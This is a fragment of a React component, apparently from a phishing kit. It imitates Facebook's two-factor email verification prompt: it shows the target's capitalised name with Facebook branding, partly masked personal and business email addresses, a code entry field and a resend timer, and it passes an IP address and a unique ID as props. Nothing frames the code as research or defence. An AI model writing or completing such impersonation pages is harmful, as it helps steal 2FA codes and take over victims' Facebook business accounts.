...
function Fa2Email({ Unik, setStep, Name, Email, BusinessEmail, Ip }) {
    const t = useTranslations('Email2FA')
    ...
    <ModalContainer>
        <ModalContent>
            <div className='text-start'>
                <span style={{ fontWeight: 500, fontSize: '14px' }}>
                    {Name
                        ? Name.split(' ')[0].charAt(0).toUpperCase() + Name.split(' ')[0].slice(1) + ' ' +
                          (Name.split(' ')[1] ? Name.split(' ')[1].charAt(0).toUpperCase() + Name.split(' ')[1].slice(1) : '')
                        : ''} • Facebook
                </span>
                <ModalTitle>
                    {t('title')}
                ...
                <SmallText>
                    {t('subtitle', {
                        emailStart: Email.substring(0, 3),
                        emailDomain: Email.substring(Email.indexOf('@')),
                        businessStart: BusinessEmail.substring(0, 3),
                        businessDomain: BusinessEmail.substring(BusinessEmail.indexOf('@'))
                    })}
                </SmallText>
            </div>
            ...
            <div>
                <div className="form-floating">
                    ...
                    />
                    <label htmlFor="floatingInput">{t('codeLabel')}</label>
                </div>
                ...
                <SmallText>
                    {Error && (
                        <>
                            {t('error.resend')} <span className='text-start fw-bold'>00:{counter < 10 && <>0</>}{counter}</span>
                        </>
                    )}
                </SmallText>
